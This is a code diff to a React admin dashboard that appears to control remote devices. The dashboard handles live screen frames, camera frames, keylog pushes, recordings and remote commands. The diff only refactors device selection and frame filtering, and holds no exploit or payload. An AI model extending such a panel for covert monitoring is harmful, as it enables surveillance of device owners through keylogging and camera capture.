@@ -15,7 +15,6 @@ import UserLogin from './components/UserLogin.jsx';
 import UserRegister from './components/UserRegister.jsx';
 import TermsAndConditions from './components/TermsAndConditions.jsx';
 import UserDashboard from './components/UserDashboard.jsx';
-import { decodeScreenFrame } from './utils/screenFrame.js';
 import './App.css';
 
 // ─── Determine initial mode from localStorage ───────────────────────────────
@@ -203,6 +202,21 @@ function AdminDashboard({ logout }) {
   const [deviceActionNotice, setDeviceActionNotice] = useState(null);
   const pingPendingRef  = useRef({});
   const chunkStreamsRef = useRef({});
+  const selectedDeviceRef = useRef(null);
+  const streamSenderRef = useRef(null);
+
+  const updateSelectedDevice = useCallback((nextDevice) => {
+    const deviceId = typeof nextDevice === 'function'
+      ? nextDevice(selectedDeviceRef.current)
+      : nextDevice;
+    if (deviceId === selectedDeviceRef.current) return;
+    selectedDeviceRef.current = deviceId;
+    setSelectedDevice(deviceId);
+    setStreamFrames({});
+    setCameraFrames({});
+    setScreenReaderPushData({});
+    streamSenderRef.current?.('dashboard:select-device', { deviceId });
+  }, []);
 
   const handleDeviceAction = useCallback(async (device, action) => {
     const isDelete = action === 'delete';
@@ -242,7 +256,7 @@ function AdminDashboard({ logout }) {
 
       if (isDelete) {
         setDevices(prev => prev.filter(item => item.deviceId !== device.deviceId));
-        setSelectedDevice(prev => prev === device.deviceId ? null : prev);
+        updateSelectedDevice(prev => prev === device.deviceId ? null : prev);
         setActivityLog(prev => [{
           id: Date.now(),
           type: 'info',
@@ -330,7 +344,7 @@ function AdminDashboard({ logout }) {
           ).map(device => device.deviceId)
         );
         setDevices(prev => prev.filter(device => !removedIds.has(device.deviceId)));
-        setSelectedDevice(prev => removedIds.has(prev) ? null : prev);
+        updateSelectedDevice(prev => removedIds.has(prev) ? null : prev);
       }
 
       setActivityLog(prev => [{
@@ -469,8 +483,9 @@ function AdminDashboard({ logout }) {
         break;
       case 'stream:frame':
         if (data.deviceId && data.frameData) {
+          if (data.deviceId !== selectedDeviceRef.current) break;
           if (data.timestamp && Date.now() - data.timestamp > 2000) break;
-          setStreamFrames(prev => ({ ...prev, [data.deviceId]: data.frameData }));
+          setStreamFrames({ [data.deviceId]: data.frameData });
           if (data.screenWidth && data.screenHeight) {
             setDevices(prev => prev.map(d => {
               if (d.deviceId !== data.deviceId) return d;
@@ -483,8 +498,9 @@ function AdminDashboard({ logout }) {
         break;
       case 'camera:frame':
         if (data.deviceId && data.frameData) {
+          if (data.deviceId !== selectedDeviceRef.current) break;
           if (data.timestamp && Date.now() - data.timestamp > 5000) break;
-          setCameraFrames(prev => ({ ...prev, [data.deviceId]: { frameData: data.frameData, cameraId: data.cameraId, _ts: data._ts || Date.now() } }));
+          setCameraFrames({ [data.deviceId]: { frameData: data.frameData, cameraId: data.cameraId, _ts: data._ts || Date.now() } });
         }
         break;
       case 'keylog:push':
@@ -545,18 +561,12 @@ function AdminDashboard({ logout }) {
         }
         break;
       case 'screen:update':
-        if (data?.deviceId) {
-          // Compressed frames stay compressed through the backend's realtime
-          // relay. Decode off the event handler so a large tree never blocks
-          // processing of later SSE messages.
-          decodeScreenFrame(data).then(frame => {
-            if (!frame?.deviceId) return;
-            setScreenReaderPushData(prev => {
-              const current = prev[frame.deviceId];
-              if (frame.sequence && current?.sequence >= frame.sequence) return prev;
-              return { ...prev, [frame.deviceId]: frame };
-            });
-          }).catch(() => {});
+        if (data?.deviceId === selectedDeviceRef.current) {
+          setScreenReaderPushData(prev => {
+            const current = prev[data.deviceId];
+            if (data.sequence && current?.sequence >= data.sequence) return prev;
+            return { [data.deviceId]: data };
+          });
         }
         break;
       case 'offline_recording:saved':
@@ -571,6 +581,7 @@ function AdminDashboard({ logout }) {
   }, []);
 
   const { connected, reconnecting, send } = useTcpStream(handleMessage);
+  streamSenderRef.current = send;
   const sendCommand = useCallback((deviceId, command, params = null) => send('command:send', { deviceId, command, params }), [send]);
 
   useEffect(() => {
@@ -611,7 +622,7 @@ function AdminDashboard({ logout }) {
         <Sidebar
           devices={devices}
           selectedDevice={selectedDevice}
-          onSelectDevice={setSelectedDevice}
+          onSelectDevice={updateSelectedDevice}
           onBlockDevice={device => handleDeviceAction(device, 'block')}
           onDeleteDevice={device => handleDeviceAction(device, 'delete')}
           deviceActionBusy={deviceActionBusy}
@@ -624,7 +635,7 @@ function AdminDashboard({ logout }) {
               sendCommand={sendCommand}
               results={commandResults.filter(r => r.deviceId === selectedDevice)}
               pending={Object.values(pendingCommands).filter(c => c.deviceId === selectedDevice)}
-              onBack={() => setSelectedDevice(null)}
+              onBack={() => updateSelectedDevice(null)}
               streamFrame={streamFrames[selectedDevice] || null}
               cameraFrame={cameraFrames[selectedDevice] || null}
               send={send}
